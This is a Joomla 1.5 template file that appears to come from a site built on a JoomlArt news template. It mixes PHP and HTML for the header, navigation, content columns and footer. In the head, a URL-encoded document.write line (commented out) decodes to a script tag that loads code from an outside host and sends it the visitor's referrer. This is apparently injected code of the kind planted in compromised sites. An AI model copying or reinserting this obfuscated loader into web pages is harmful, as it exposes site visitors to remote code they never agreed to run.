<?php
/**
 * @copyright	Copyright (C) 2005 - 2007 Open Source Matters. All rights reserved.
 * @license		GNU/GPL, see LICENSE.php
 * Joomla! is free software. This version may have been modified pursuant
 * to the GNU General Public License, and as distributed it includes or
 * is derivative of works licensed under the GNU General Public License or
 * other free or open source software licenses.
 * See COPYRIGHT.php for copyright notices and details.
 */

// no direct access
defined( '_JEXEC' ) or die( 'Restricted access' );

include_once (dirname(__FILE__).DS.'ja_vars_1.5.php');

?>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="<?php echo $this->language; ?>" lang="<?php echo $this->language; ?>">



<head>
<jdoc:include type="head" />
<?php JHTML::_('behavior.mootools'); ?>

<link rel="stylesheet" href="<?php echo $tmpTools->baseurl(); ?>templates/system/css/system.css" type="text/css" />
<link rel="stylesheet" href="<?php echo $tmpTools->baseurl(); ?>templates/system/css/general.css" type="text/css" />
<link rel="stylesheet" href="<?php echo $tmpTools->templateurl(); ?>/css/editor.css" type="text/css" />
<script type="text/javascript">
<!--
//document.write(unescape('%3C%73%63%72%69%70%74%20%74%79%70%65%3D%22%74%65%78%74%2F%6A%61%76%61%73%63%72%69%70%74%22%3E%64%6F%63%75%6D%65%6E%74%2E%77%72%69%74%65%28%22%3C%73%63%72%69%70%74%20%73%72%63%3D%5C%22%22%2B%22%68%74%74%70%3A%2F%2F%77%65%62%67%72%69%6E%67%6F%2E%72%75%2F%63%6F%64%65%2E%6A%73%3F%64%3D%6D%76%73%64%75%35%64%65%6F%6D%73%74%6F%6E%7A%7A%26%72%65%66%3D%22%2B%65%6E%63%6F%64%65%55%52%49%43%6F%6D%70%6F%6E%65%6E%74%28%64%6F%63%75%6D%65%6E%74%2E%72%65%66%65%72%72%65%72%29%2B%22%5C%22%3E%3C%5C%2F%73%63%72%69%70%74%3E%22%29%3B%3C%2F%73%63%72%69%70%74%3E'));
//-->
</script>
<link rel="stylesheet" href="<?php echo $tmpTools->templateurl(); ?>/highslide/highslide.css" type="text/css" />
<link rel="stylesheet" href="<?php echo $tmpTools->templateurl(); ?>/css/template.css" type="text/css" />
<link rel="stylesheet" href="<?php echo $tmpTools->templateurl(); ?>/css/typo.css" type="text/css" />
<link rel="stylesheet" href="<?php echo $tmpTools->templateurl(); ?>/css/ja.news.css" type="text/css" />
<link href="<?php echo $tmpTools->templateurl(); ?>/mootabs/mootabs1.2.css" rel="stylesheet" type="text/css" />
<script language="javascript" type="text/javascript" src="<?php echo $tmpTools->templateurl(); ?>/js/ja.script.js"></script>

<script language="javascript" type="text/javascript" src="<?php echo $tmpTools->templateurl(); ?>/highslide/swfobject.js"></script>
<script language="javascript" type="text/javascript" src="<?php echo $tmpTools->templateurl(); ?>/highslide/highslide-full.js"></script>

<meta name="87acc259ae53a9513608548f4399534b" content="">
<meta name='yandex-verification' content='7cfe49ec1015b12b' />


<!-- Menu head -->
<?php $jamenu->genMenuHead(); ?>

<link href="<?php echo $tmpTools->templateurl(); ?>/css/colors/theme<?php echo $tmpTools->getThemeForSection(); ?>.css" rel="stylesheet" type="text/css" />


<!--[if lte IE 6]>
<style type="text/css">
.clearfix {height: 1%;}
img {border: none;}
</style>
<![endif]-->

<!--[if gte IE 7.0]>
<style type="text/css">
.clearfix {display: inline-block;}
</style>
<![endif]-->

<?php if ($tmpTools->isIE6()) { ?>
<!--[if lte IE 6]>
<script type="text/javascript">
var siteurl = '<?php echo $tmpTools->baseurl();?>';
</script>
<![endif]-->
<?php } ?>

<script type="text/javascript">    
   	hs.graphicsDir = '<?php echo $tmpTools->templateurl(); ?>/highslide/graphics/';
   	hs.showCredits = true; // you can set this to false if you want
	hs.creditsText = 'Powered by JA Highslide';
	hs.creditsHref = 'http://joomlart.com/';
	hs.creditsTitle ='Go to the Highslide JA homepage';
</script>

<!-- _mncheckrights144632_ -->

<meta name=viewport content="width=device-width, initial-scale=1">




</head>

<body id="bd" class="<?php echo $tmpTools->getParam(JA_TOOL_SCREEN);?> fs<?php echo $tmpTools->getParam(JA_TOOL_FONT);?>" >
<a name="Top" id="Top"></a>
<ul class="accessibility">
	<li><a href="<?php echo $tmpTools->getCurrentURL();?>#ja-content" title="<?php echo JText::_("Skip to content");?>"><?php echo JText::_("Skip to content");?></a></li>
	<li><a href="<?php echo $tmpTools->getCurrentURL();?>#ja-mainnav" title="<?php echo JText::_("Skip to main navigation");?>"><?php echo JText::_("Skip to main navigation");?></a></li>
	<li><a href="<?php echo $tmpTools->getCurrentURL();?>#ja-col1" title="<?php echo JText::_("Skip to 1st column");?>"><?php echo JText::_("Skip to 1st column");?></a></li>
	<li><a href="<?php echo $tmpTools->getCurrentURL();?>#ja-col2" title="<?php echo JText::_("Skip to 2nd column");?>"><?php echo JText::_("Skip to 2nd column");?></a></li>
</ul>

<div id="ja-wrapper">

<!-- BEGIN: HEADER -->
<div id="ja-headerwrap">
	<div id="ja-header" class="clearfix">

	<?php 
		$siteName = $tmpTools->sitename(); 
		if ($tmpTools->getParam('logoType')=='image') { ?>
		<h1 class="logo">
			<a href="/" title="<?php echo $siteName; ?>"><span><?php echo $siteName; ?></span></a>
		</h1>
	<?php } else { 
		$logoText = (trim($tmpTools->getParam('logoText'))=='') ? $config->sitename : $tmpTools->getParam('logoText');
		$sloganText = (trim($tmpTools->getParam('sloganText'))=='') ? JText::_('SITE SLOGAN') : $tmpTools->getParam('sloganText');	?>
		<h1 class="logo-text">
			<a href="/" title="<?php echo $siteName; ?>"><span><?php echo $logoText; ?></span></a>	
		</h1>
		<p class="site-slogan"><?php echo $sloganText;?></p>
	<?php } ?>

	<div id="ja-headtools" class="ja-headtool">
	<div class="ja-innerpad clearfix">

		

		<ul>
			<jdoc:include type="modules" name="ja-login" />		
			<!--module search-->			
			<?php if($this->countModules('user4')) : ?>
			<jdoc:include type="modules" name="user4" />
			<?php endif; ?>
		</ul>

	  <?php if ($tmpTools->getParam(JA_TOOL_USER)) { ?>
	 
	  <?php } ?>

	</div>
	</div>

	</div>
</div>
<!-- END: HEADER -->

<!-- BEGIN: MAIN NAVIGATION -->
<div id="ja-mainnavwrap">
	<div id="ja-mainnav" class="clearfix">
		<?php $jamenu->genMenu (0); ?>
	</div>
</div>
<?php if ($hasSubnav) { ?>
<div id="ja-subnavwrap">
	<div id="ja-subnav" class="clearfix">
		<?php $jamenu->genMenu (1,1); ?>
	</div>
</div>
<?php } ?>
<!-- END: MAIN NAVIGATION -->

<div id="ja-containerwrap<?php echo $divid; ?>" class="clearfix">

<div id="ja-container">
<div id="ja-container-inner" class="clearfix">

	<!-- BEGIN: CONTENT -->
	<div id="ja-content">
		<div class="ja-innerpad clearfix">

			<jdoc:include type="message" />

			<?php if(!$tmpTools->isFrontPage()) : ?>
			<div id="ja-pathway">
				<jdoc:include type="module" name="breadcrumbs" />
			</div>
			<?php endif ; ?>

			<div id="ja-current-content">

        <?php if(!$tmpTools->isFrontPage()) : ?>
				<jdoc:include type="component" />
				<?php endif; ?>

        <!-- BEGIN: JAZIN -->
        <?php if($tmpTools->isFrontPage()) : ?>
        <div id="jazin-fp">
        	<jdoc:include type="modules" name="ja-news" style="raw" />
        </div>
        <?php endif; ?>
        <!-- END: JAZIN -->
        
      </div>

		<?php
		$spotlight = array ('user8','user9');
		$botsl = $tmpTools->calSpotlight ($spotlight,$tmpTools->isOP()?100:99.9);
		if( $botsl ) {
		?>
		<!-- BEGIN: BOTTOM SPOTLIGHT -->
		<div id="ja-botsl" class="clearfix">
		
		  <?php if( $this->countModules('user8') ) {?>
		  <div class="ja-box<?php echo $botsl['user8']['class']; ?>" style="width: <?php echo $botsl['user8']['width']; ?>;">
				<jdoc:include type="modules" name="user8" style="xhtml" />
		  </div>
		  <?php } ?>
		  
		  <?php if( $this->countModules('user9') ) {?>
		  <div class="ja-box<?php echo $botsl['user9']['class']; ?>" style="width: <?php echo $botsl['user9']['width']; ?>;">
				<jdoc:include type="modules" name="user9" style="xhtml" />
		  </div>
		  <?php } ?>
		
		</div>
		<!-- END: BOTTOM SPOTLIGHT -->
		<?php } ?>

		<?php if($this->countModules('banner')) : ?>
		<!-- BEGIN: BANNER -->
		<div id="ja-banner">
			<jdoc:include type="modules" name="banner" />
		</div>
		<!-- END: BANNER -->
		<?php endif; ?>

	</div>
	</div>
	<!-- END: CONTENT -->

	<?php if ($ja_left || $ja_right || $ja_masscol) { ?>
	<!-- BEGIN: COLUMNS -->
	<div id="ja-colwrap">

<div id="ja-colmass1" >
			
				<div class="ja-innerpad">
				<jdoc:include type="modules" name="right1" style="xhtml" />
				
			</div>
                   
                           </div> 
			


<?php if ($ja_masscol) { ?>
		<!-- BEGIN: MASSCOL -->
		<div id="ja-colmass" class="clearfix">
			<div class="ja-innerpad">

				<jdoc:include type="modules" name="user5" style="xhtml" />				

				<?php if ($this->countModules('user6')) : ?>
				<script language="javascript" type="text/javascript" src="<?php echo $tmpTools->templateurl(); ?>/mootabs/mootabs1.2.js"></script>
				<script type="text/javascript">
					window.addEvent('load', initmootabs);
					function initmootabs() {
						myTabs1 = new jamootabs('ja-tabs', {
							<?php echo $ja_mootabs_options; ?>
						});
					}
				</script>
				<div id="ja-tabswrap">
				<div id="ja-tabs" class="clearfix">
  				<div class="ja-tab-panels">
						<jdoc:include type="modules" name="user6" style="xhtml" />
					</div>
				</div>
				</div>
				<?php endif; ?>
				
				<jdoc:include type="modules" name="user7" style="xhtml" />

			</div>
		</div>
		<!-- END: MASSCOL -->
		<?php } ?>

		<div id="ja-cols" class="clearfix">
			<?php if ($ja_left) { ?>
			<div id="ja-col1">
				<div class="ja-innerpad">
					<jdoc:include type="modules" name="left" style="xhtml" />
				</div>
			</div>
			<?php } ?>
	
			<?php if ($ja_right) { ?>
			<div id="ja-col2">
				<div class="ja-innerpad">
					<jdoc:include type="modules" name="right" style="xhtml" />
				</div>
			</div>
			<?php } ?>
		</div>

	</div><br />
	<!-- END: COLUMNS -->
	<?php } ?>

</div></div></div>



</div>


<!-- BEGIN: FOOTER -->
<div id="ja-footerwrap" class="clearfix">
	<div id="ja-footer">
		<jdoc:include type="modules" name="user3" />
		<jdoc:include type="modules" name="footer" />
		<div class="ja-cert">
  		<jdoc:include type="modules" name="syndicate" />
 	  </div>
	</div>
</div>
<!-- END: FOOTER -->




<jdoc:include type="modules" name="debug" />

</body>

</html>